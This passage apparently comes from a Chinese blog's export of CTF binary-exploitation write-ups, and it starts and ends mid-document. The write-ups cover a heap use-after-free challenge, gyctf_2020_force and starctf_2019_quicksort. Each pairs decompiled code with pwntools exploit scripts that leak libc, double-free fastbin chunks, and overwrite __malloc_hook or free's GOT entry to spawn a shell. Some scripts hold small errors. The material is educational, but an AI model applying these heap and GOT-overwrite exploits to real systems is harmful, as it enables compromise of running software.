ptr2 = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x28</span>uLL);<span class=\"comment\">//一个ptr chunk</span></span><br><span class=\"line\">  v7 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  *(_QWORD *)ptr2 = sentence_ptr;             </span><br><span class=\"line\">                                                </span><br><span class=\"line\">  ptr2[<span class=\"number\">2</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  *((_QWORD *)ptr2 + <span class=\"number\">2</span>) = sentence_ptr;</span><br><span class=\"line\">  ptr2[<span class=\"number\">6</span>] = size;</span><br></pre></td></tr></table></figure>\n<h3><span id=\"search\">search</span></h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( item )</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">   <span class=\"keyword\">do</span></span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">     <span class=\"keyword\">if</span> ( *(_BYTE *)head-&gt;sentence_ptr )</span><br><span class=\"line\">     &#123;</span><br><span class=\"line\">       <span class=\"keyword\">if</span> ( head-&gt;size == size &amp;&amp; !<span class=\"built_in\">memcmp</span>((<span class=\"keyword\">const</span> <span class=\"keyword\">void</span> *)head-&gt;content, ptr, size) )</span><br><span class=\"line\">       &#123;</span><br><span class=\"line\">         __printf_chk(<span class=\"number\">1LL</span>, <span class=\"string\">&quot;Found %d: &quot;</span>, (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)head-&gt;word_size);</span><br><span class=\"line\">         fwrite((<span class=\"keyword\">const</span> <span class=\"keyword\">void</span> *)head-&gt;sentence_ptr, <span class=\"number\">1uLL</span>, head-&gt;word_size, <span class=\"built_in\">stdout</span>);</span><br><span class=\"line\">         <span class=\"built_in\">putchar</span>(<span class=\"number\">10</span>);</span><br><span class=\"line\">         <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Delete this sentence (y/n)?&quot;</span>);</span><br><span class=\"line\">         read_word((__int64)v3, <span class=\"number\">2</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\">         <span class=\"keyword\">if</span> ( v3[<span class=\"number\">0</span>] == <span class=\"string\">&#x27;y&#x27;</span> )</span><br><span class=\"line\">         &#123;</span><br><span class=\"line\">           <span class=\"built_in\">memset</span>((<span class=\"keyword\">void</span> *)head-&gt;sentence_ptr, <span class=\"number\">0</span>, head-&gt;word_size);</span><br><span class=\"line\">           <span class=\"built_in\">free</span>((<span class=\"keyword\">void</span> *)head-&gt;sentence_ptr);</span><br><span class=\"line\">           <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Deleted!&quot;</span>);</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">     head = (word *)head-&gt;next;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">while</span> ( head );</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> <span class=\"built_in\">free</span>(ptr);</span><br></pre></td></tr></table></figure>\n<p>这个功能相当于一个add加一个free，如果search到了word就可以删除chunk。注意一定是word和size完全匹配才能成功搜索：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-29%20%E4%B8%8A%E5%8D%8811.18.22.png\" alt=\"截屏2022-03-29 上午11.18.22\"></p>\n<h2><span id=\"漏洞点\">漏洞点</span></h2><h3><span id=\"read_str\">read_str</span></h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( size &lt;= <span class=\"number\">0</span> )</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">   v4 = <span class=\"number\">0</span>;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> <span class=\"keyword\">else</span></span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">   v4 = <span class=\"number\">0</span>;</span><br><span class=\"line\">   <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">     v5 = (_BYTE *)(head + v4);</span><br><span class=\"line\">     v6 = fread(v5, <span class=\"number\">1uLL</span>, <span class=\"number\">1uLL</span>, <span class=\"built_in\">stdin</span>);        <span class=\"comment\">// read one byte from stdin to &amp;v5</span></span><br><span class=\"line\">     <span class=\"keyword\">if</span> ( v6 &lt;= <span class=\"number\">0</span> )</span><br><span class=\"line\">       <span class=\"keyword\">break</span>;</span><br><span class=\"line\">     <span class=\"keyword\">if</span> ( *v5 == <span class=\"string\">&#x27;\\n&#x27;</span> &amp;&amp; value_0 )</span><br><span class=\"line\">     &#123;</span><br><span class=\"line\">       <span class=\"keyword\">if</span> ( v4 )</span><br><span class=\"line\">       &#123;</span><br><span class=\"line\">         *v5 = <span class=\"number\">0</span>;</span><br><span class=\"line\">         <span class=\"keyword\">return</span>;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">       v4 = v6 - <span class=\"number\">1</span>;</span><br><span class=\"line\">       <span class=\"keyword\">if</span> ( size &lt;= v6 - <span class=\"number\">1</span> )</span><br><span class=\"line\">         <span class=\"keyword\">break</span>;</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">     <span class=\"keyword\">else</span></span><br><span class=\"line\">     &#123;</span><br><span class=\"line\">       v4 += v6;</span><br><span class=\"line\">       <span class=\"keyword\">if</span> ( size &lt;= v4 )</span><br><span class=\"line\">         <span class=\"keyword\">break</span>;</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<p>​        在读取的时候，if读入的终止判断为<code>if ( *v5 == &#39;\\n&#39; &amp;&amp; value_0 )</code>，<code>value_0</code>为传入的参数，恒为0，因此这个0后面的条件语句就不管用了，直接跳转到else的情况，也就是一直读入size大小的字符为止，所以在执行程序的时候回车无法结束输入，同时输入的字符串在内存中也没有空字节作为结尾。</p>\n<p>​        既然又是没有空字节，那么又可以考虑内存泄露的问题了。</p>\n<h3><span id=\"delete\">delete</span></h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( v3[<span class=\"number\">0</span>] == <span class=\"string\">&#x27;y&#x27;</span> )</span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            <span class=\"built_in\">memset</span>((<span class=\"keyword\">void</span> *)head-&gt;sentence_ptr, <span class=\"number\">0</span>, head-&gt;word_size);</span><br><span class=\"line\">            <span class=\"built_in\">free</span>((<span class=\"keyword\">void</span> *)head-&gt;sentence_ptr);</span><br><span class=\"line\">            <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Deleted!&quot;</span>);</span><br><span class=\"line\">          &#125;</span><br></pre></td></tr></table></figure>\n<p>​        这里在free的时候把<code>head-&gt;sentence_ptr</code>置0了,并且由于对于单词的索引实际上是sentence ptr的引用，所以单词实际上也被置0了，然而指向单词的结构体指针，并没有被置0，因此能继续进行单词的搜索,只不过此刻单词需要搜索的内容为‘\\x00’。</p>\n<p>​        </p>\n<h2><span id=\"利用\">利用</span></h2><h3><span id=\"利用unsortedbin-leak-libc获取malloc-hook\">利用unsortedbin leak libc，获取malloc hook</span></h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">sentence = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x80</span> + <span class=\"string\">b&#x27;bbbb bbbb bbbb b&#x27;</span></span><br><span class=\"line\">index_sentence(<span class=\"built_in\">len</span>(sentence),sentence)<span class=\"comment\">#small bin</span></span><br><span class=\"line\">search_word(<span class=\"number\">1</span>,<span class=\"string\">&quot;b&quot;</span>) </span><br><span class=\"line\">delete()</span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\">search_word(<span class=\"number\">1</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;Found&#x27;</span> + <span class=\"built_in\">str</span>(<span class=\"built_in\">len</span>(sentence)) + <span class=\"string\">&#x27;: &#x27;</span>)</span><br><span class=\"line\">unsorted_bin_addr = u64(p.recv(<span class=\"number\">8</span>))</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Delete this sentence (y/n)?&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;n&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p>​        先让一个small chunk进入unsorted bin，从gdb中我们可以看到其与<code>main_arena</code>的相对偏移，但是我们需要利用漏洞将其leak出来才能够利用。</p>\n<p>​        </p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-29%20%E4%B8%8B%E5%8D%883.41.03.png\" alt=\"截屏2022-03-29 下午3.41.03\"></p>\n<p>​        因为之前说到，就算delete了sentence，word chunk中的指针并没有被置0，还是能够搜索，所以只需要搜索<code>\\x00</code>，就能输出unsortedbin的地址。</p>\n<h3><span id=\"构造double-free将fake-chunk分配至malloc-hook\">构造double free，将fake chunk分配至malloc hook</span></h3><h5><span id=\"绕过验证构造fastbin循环链表\">绕过验证，构造fastbin循环链表</span></h5><p>​        虽然单词的指针并没有被置0，但是想要进行搜索还是需要绕过<code>if ( *(_BYTE *)head-&gt;sentence_ptr )</code>的验证。</p>\n<p>​        所以可以按照一般构造fastbin double free的思路来处理这里的chunk。</p>\n<p>​        因为我们想要修改malloc hook，所以至少需要一个fd指向malloc hook的fake chunk和一个内容为one gadget的fake chunk，同时两个chunk都需要被分配在同一个ptr上，所以这里至少要构造出<code>a-&gt;b-&gt;a-&gt;...</code></p>\n<p>​        </p>\n<p>​            所以实现的过程大概是申请三个chunk，再依次删除：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">index_sentence(<span class=\"number\">0x60</span>,<span class=\"string\">b&#x27;m&#x27;</span>*<span class=\"number\">0x5f</span>+ <span class=\"string\">b&#x27;a&#x27;</span>)<span class=\"comment\">#a</span></span><br><span class=\"line\">index_sentence(<span class=\"number\">0x60</span>,<span class=\"string\">b&#x27;m&#x27;</span>*<span class=\"number\">0x5f</span>+ <span class=\"string\">b&#x27;a&#x27;</span>)<span class=\"comment\">#b</span></span><br><span class=\"line\">index_sentence(<span class=\"number\">0x60</span>,<span class=\"string\">b&#x27;m&#x27;</span>*<span class=\"number\">0x5f</span>+ <span class=\"string\">b&#x27;a&#x27;</span>)<span class=\"comment\">#c</span></span><br><span class=\"line\">search_word(<span class=\"number\">1</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">delete()</span><br><span class=\"line\">delete()</span><br><span class=\"line\">delete()</span><br></pre></td></tr></table></figure>\n<p>​        这样fastbin链表如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">fastbin -&gt; a -&gt;b -&gt;c -&gt; NULL</span><br></pre></td></tr></table></figure>\n<p>​            接着利用漏洞点，搜索空字节，double free b和a</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">search_word(<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">delete()<span class=\"comment\">#delete a</span></span><br><span class=\"line\">delete()<span class=\"comment\">#delete b</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Delete this sentence (y/n)?&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;n&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#fastbin =&gt;b -&gt;a -&gt; b -&gt; a -&gt; c -&gt; null</span></span><br></pre></td></tr></table></figure>\n<p>​    </p>\n<p>这样再申请一个chunk，就能覆盖此刻b chunk的fd，将其修改为malloc hook。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">index_sentence(<span class=\"number\">0x60</span>,content)<span class=\"comment\">#modify the fd ptr</span></span><br><span class=\"line\"></span><br><span class=\"line\">index_sentence(<span class=\"number\">0x60</span>,<span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">0x60</span>)<span class=\"comment\">#point to malloc hook</span></span><br><span class=\"line\"></span><br><span class=\"line\">index_sentence(<span class=\"number\">0x60</span>,<span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">0x60</span>)<span class=\"comment\">#chunk a</span></span><br><span class=\"line\"></span><br><span class=\"line\">one_gadget_addr = libc_base + <span class=\"number\">0x3f3d6</span></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">0x13</span> + p64(one_gadget_addr)<span class=\"comment\">#add to chunk b space again</span></span><br><span class=\"line\">payload = payload.ljust(<span class=\"number\">0x60</span>, <span class=\"string\">b&#x27;q&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">index_sentence(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n","categories":["Binary_security"],"tags":["UAF"]},{"title":"gyctf_2020_force","url":"/2022/03/30/week5-3.1/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-wLSdqSpC\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> </p>\n<h2><span id=\"overview\">overview</span></h2><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-30%20%E4%B8%8A%E5%8D%8811.22.37.png\" alt=\"截屏2022-03-30 上午11.22.37\"></p>\n<p>好绿。</p>\n<h2><span id=\"逆向\">逆向</span></h2><p>​        程序比较简约，只有add和put两个功能。逻辑也不复杂。漏洞的话也比较明显，一个是程序直接把heap base白给了。另一个是虽然询问了size的大小，但是在实际add的时候完全没有根据size分配chunk,并且可以分配很大size的chunk。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-30%20%E4%B8%8B%E5%8D%883.00.40.png\" alt=\"截屏2022-03-30 下午3.00.40\"></p>\n<p>​        导致我们可以很轻易地修改top chunk的size。        </p>\n<p>​        并且put功能看起来只能打印D93上的东西,也就是一个空字节。</p>\n<h2><span id=\"利用\">利用</span></h2><h3><span id=\"修改top-chunk-size\">修改top chunk size</span></h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">p.sendafter(<span class=\"string\">&quot;content&quot;</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x10</span> + p64(<span class=\"number\">0xffffffffffffffff</span>)*<span class=\"number\">2</span>)</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-30%20%E4%B8%8B%E5%8D%883.07.21.png\" alt=\"截屏2022-03-30 下午3.07.21\"></p>\n<p>​        但是随之而来的问题就是，除了程序白给的chunk ptr以外，没有任何输出函数，以至于无法leak libc。所以只能从这个免费打印的ptr下手。</p>\n<p>​        一个trick就是，我们可以add一个巨大的chunk，巨大到需要mmap来分配空间，而mmap分配的内存空间与libc是有固定的偏移的，我们能够轻易地拿到mmap分配的chunk的地址，也就能计算出libc base。</p>\n<p>​        这里我随意申请了100000000000 size的chunk。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-30%20%E4%B8%8B%E5%8D%883.49.58.png\" alt=\"截屏2022-03-30 下午3.49.58\"></p>\n<p>​        可以看到，比如我们获得了addr为<code>0x7fe8af273000</code>，那么这个地址与libc基址的偏移就是<code>0x76F000</code>。</p>\n<p>​        这样就能够leak libc，计算malloc hook的地址了。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#leak libc with mmap</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;2:puts\\n&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;size&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;100000000000&#x27;</span>)</span><br><span class=\"line\">chunk_addr  = u64(p.recvuntil(<span class=\"string\">&quot;bin addr &quot;</span>)[:<span class=\"number\">8</span>])</span><br><span class=\"line\">libc_base = chunk_addr + <span class=\"number\">0x76F000</span></span><br><span class=\"line\">log.success(<span class=\"string\">&quot;libc_base:&quot;</span> + <span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\">malloc_hook_addr = libc_base + libc.symbols[<span class=\"string\">&quot;__malloc_hook&quot;</span>]</span><br></pre></td></tr></table></figure>\n<p>​        接着就是修改top chunk的指针，这里主要涉及到hof的知识点，需要注意的就是offset的计算。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#leak top chunk addr</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;2:puts\\n&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;size&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;bin addr &quot;</span>)</span><br><span class=\"line\">top_chunk_addr = u64(p.recv(<span class=\"number\">8</span>)) - <span class=\"number\">0x20</span></span><br><span class=\"line\">log.info(<span class=\"string\">&quot;top_chunk_addr :&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(top_chunk_addr)))</span><br><span class=\"line\"><span class=\"comment\">#modify top chunk addr</span></span><br><span class=\"line\">p.sendafter(<span class=\"string\">&quot;content&quot;</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x10</span> + p64(<span class=\"number\">0xffffffffffffffff</span>)*<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"comment\">#modify top chunk ptr</span></span><br><span class=\"line\">fake_size  = malloc_hook_addr - top_chunk_addr - <span class=\"number\">0x10</span><span class=\"comment\">#0x2AAAA27CA9C0</span></span><br><span class=\"line\">add(fake_size,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#modify malloc hook space with onegadget</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,p64(libc_base + one_gadget))</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<p>​        </p>\n<p>​</p>\n","categories":["Binary_security"],"tags":["hof"]},{"title":"starctf_2019_quicksort","url":"/2022/03/31/week5-4.1/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-XdLMDJYY\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> </p>\n<h2><span id=\"overview\">overview</span></h2><p>​    <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-30%20%E4%B8%8B%E5%8D%889.52.50.png\" alt=\"截屏2022-03-30 下午9.52.50\"></p>\n<p>libc大版本是2.23。</p>\n<h2><span id=\"re\">re</span></h2><p>​        整体实现了一个简单的快速排序功能，在输入具体需要排序的数的时候存在溢出，但是由于开启了canary，并不是很好利用。并且num的储存其实是在堆上的，所以我以为这是个栈题，这其实是个堆题。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">memset</span>(s, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(s));</span><br><span class=\"line\">  num = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;how many numbers do you want to sort?&quot;</span>);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">&quot;%d&quot;</span>, &amp;num);</span><br><span class=\"line\">  getchar();                                   </span><br><span class=\"line\">  num_ptr = <span class=\"built_in\">malloc</span>(<span class=\"number\">4</span> * num);<span class=\"comment\">//add num_chunk</span></span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt; num; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;the %dth number:&quot;</span>, i + <span class=\"number\">1</span>);</span><br><span class=\"line\">    gets(s);<span class=\"comment\">//</span></span><br><span class=\"line\">    v0 = (<span class=\"keyword\">int</span> *)((<span class=\"keyword\">char</span> *)num_ptr + <span class=\"number\">4</span> * i);</span><br><span class=\"line\">    *v0 = atoi(s);<span class=\"comment\">//将输入的num储存在num_chunk中</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  sorting(num_ptr, <span class=\"number\">0</span>, num - <span class=\"number\">1</span>);<span class=\"comment\">//不想看有没有洞的排序</span></span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Here is the result:&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( j = <span class=\"number\">0</span>; j &lt; num; ++j )</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d &quot;</span>, *((_DWORD *)num_ptr + j));<span class=\"comment\">//输出结果</span></span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(&amp;byte_8048AD2);<span class=\"comment\">//看不懂有啥用。</span></span><br><span class=\"line\">  <span class=\"built_in\">free</span>(num_ptr);<span class=\"comment\">//意义不大</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-30%20%E4%B8%8B%E5%8D%8810.06.15.png\" alt=\"截屏2022-03-30 下午10.06.15\"></p>\n<p>​        随便输点东西，堆上布局是这样。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-31%20%E4%B8%8B%E5%8D%883.03.29.png\" alt=\"截屏2022-03-31 下午3.03.29\"></p>\n<p>​        可以看到这个gets还是起了大用处的。<img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-31%20%E4%B8%8B%E5%8D%883.14.36.png\" alt=\"截屏2022-03-31 下午3.14.36\"></p>\n<p>​        研究了一下，发现这里目前最大的漏洞在于储存输入num个数的变量和控制num chunk的ptr是相邻的，所以可以通过gets 将ptr覆盖成任意数,这样在输入num的时候就能够实现任意地址写。</p>\n<p>（之前看瞎眼了，还以为覆盖的只是num的size在栈上的值，以为要通过num的idx来任意地址写，太恐怖了）</p>\n<h2><span id=\"利用\">利用</span></h2><ol>\n<li>需要至少两次malloc，以在print后继续输入payload。因为在这个阶段我们并没有leak任何的真实地址，所以考虑覆盖某个got为main addr。</li>\n<li>在leak libc后，假定能够再次输入，需要选择合适的函数来覆盖为system，条件是参数可控。（这里似乎只有free是可能的）</li>\n</ol>\n<p>​        所以第一次执行时，申请两个num，输入第一个num时覆盖num ptr为free got addr，并在payload前四位填写free got addr，输入第二个num时，此时num ptr已经为free got addr，填写main addr覆盖，接着printf leak libc，call main，进行第二次num chunk的申请，同样地将free got 覆盖为system addr。并再次覆盖num ptr为某个可写的地址，输入binsh字符串从而getshell。</p>\n<p>​        好麻。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;/glibc/2.23/32/lib/libc-2.23.so&quot;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;././starctf_2019_quicksort&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p = process([<span class=\"string\">&quot;/glibc/2.23/32/lib/ld-2.23.so&quot;</span>,<span class=\"string\">&quot;./starctf_2019_quicksort&quot;</span>],env=&#123;<span class=\"string\">&quot;LD_PRELOAD&quot;</span> : <span class=\"string\">&quot;/glibc/2.23/32/lib/libc.so.6&quot;</span>&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">puts_got_addr = elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">free_got_addr = elf.got[<span class=\"string\">&#x27;free&#x27;</span>]</span><br><span class=\"line\">gets_got_addr = elf.got[<span class=\"string\">&#x27;gets&#x27;</span>]</span><br><span class=\"line\">main_addr = <span class=\"number\">0x8048816</span></span><br><span class=\"line\">addr = <span class=\"number\">0x804b000</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;how many numbers do you want to sort?&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">b&quot;2&quot;</span>)</span><br><span class=\"line\">payload = p32(free_got_addr).ljust(<span class=\"number\">16</span>,<span class=\"string\">b&#x27;a&#x27;</span>)+ p32(<span class=\"number\">2</span>) + p32(<span class=\"number\">1</span>)*<span class=\"number\">2</span> + p32(free_got_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;the 1th number:&quot;</span>)<span class=\"comment\">#idx 1</span></span><br><span class=\"line\">p.sendline(payload)<span class=\"comment\">#overwrite num_ptr with free got addr</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;the 2th number:&quot;</span>)<span class=\"comment\">#idx 2</span></span><br><span class=\"line\">p.sendline(p32(main_addr))<span class=\"comment\">#modify free_got to main addr</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Here is the result:&quot;</span>)</span><br><span class=\"line\">puts_addr = u32(p.recvuntil(<span class=\"string\">&quot;1&quot;</span>)[:<span class=\"number\">4</span>])<span class=\"comment\">#leak libc addr</span></span><br><span class=\"line\">log.success(<span class=\"string\">&quot;free_addr =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(free_addr)))</span><br><span class=\"line\">system_addr = free_addr - (libc.symbols[<span class=\"string\">&#x27;free&#x27;</span>] - libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>])</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;system_addr =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(system_addr)))</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;how many numbers do you want to sort?&quot;</span>)<span class=\"comment\">#ret to main again</span></span><br><span class=\"line\">p.sendline(<span class=\"string\">b&quot;2&quot;</span>)<span class=\"comment\">#allocate chunk in free got addr</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = p32(system_addr).ljust(<span class=\"number\">16</span>,<span class=\"string\">b&#x27;a&#x27;</span>)+ p32(<span class=\"number\">2</span>) + p32(<span class=\"number\">1</span>)*<span class=\"number\">2</span> +p32(addr)<span class=\"comment\">#overwrite freegot with system</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;the 1th number:&quot;</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;the 2th number:&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">b&quot;/bin/sh;&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>​        </p>\n<p>​        </p>\n<p>​        </p>\n<p>​</p>\n","categories":["Binary_security"],"tags":["HEAP - Heap overflow"]},{"title":"NoLeak","url":"/2022/04/01/week6-3.1/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-XRAvPwlO\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> </p>\n<h2><span id=\"overview\">overview</span></h2><p><img 